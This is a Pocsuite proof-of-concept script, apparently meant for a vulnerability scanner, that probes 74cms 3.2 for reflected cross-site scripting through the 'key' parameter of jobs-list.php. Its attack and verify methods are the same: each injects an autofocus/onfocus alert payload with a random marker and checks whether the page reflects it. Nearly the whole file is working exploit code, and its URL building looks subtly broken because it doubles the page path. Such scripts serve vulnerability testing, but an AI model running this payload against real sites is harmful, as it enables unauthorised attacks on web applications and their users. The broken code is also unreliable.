#!/usr/bin/python
# -*- coding:utf-8 -*-

import string
import random
import time
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    name = '74cms 3.2 jobs_list Cross sitescripting'
    vulID = '0'
    author = ['LRestless']
    vulType = 'xss'
    version = '1'
    references = ['']
    desc = '''74cms 3.2 jobs_list Cross sitescripting'''

    vulDate = ''
    createDate = '2019-03-29'
    updateDate = '2019-03-29'

    appName = '74cms'
    appVersion = '3.20'
    appPowerLink = 'http://www.74cms.com'
    samples = ['']

    def _attack(self):
        """attack mode"""
        result = {}
        s = req.Session()
        s.get(self.url)
        self.url = self.url.strip('/') + "/jobs/jobs-list.php"
        flag = "".join(random.choice(string.ascii_letters) for _ in xrange(0, 8))
        flag = flag.lower()
        payload = "/jobs/jobs-list.php?key=%22%20autofocus%20onfocus=alert%28{}%29%20style=%22%22".format(flag)
        url = self.url + payload
        resp = s.get(url)
        time.sleep(2)
        if '" autofocus onfocus=alert({}) style='.format(flag) in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def _verify(self):
        """verify  mode"""
        result = {}
        s = req.Session()
        s.get(self.url)
        self.url = self.url.strip('/') + "/jobs/jobs-list.php"
        flag = "".join(random.choice(string.ascii_letters) for _ in xrange(0, 8))
        flag = flag.lower()
        payload = "/jobs/jobs-list.php?key=%22%20autofocus%20onfocus=alert%28{}%29%20style=%22%22".format(flag)
        url = self.url + payload
        resp = s.get(url)
        time.sleep(2)
        if '" autofocus onfocus=alert({}) style='.format(flag) in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

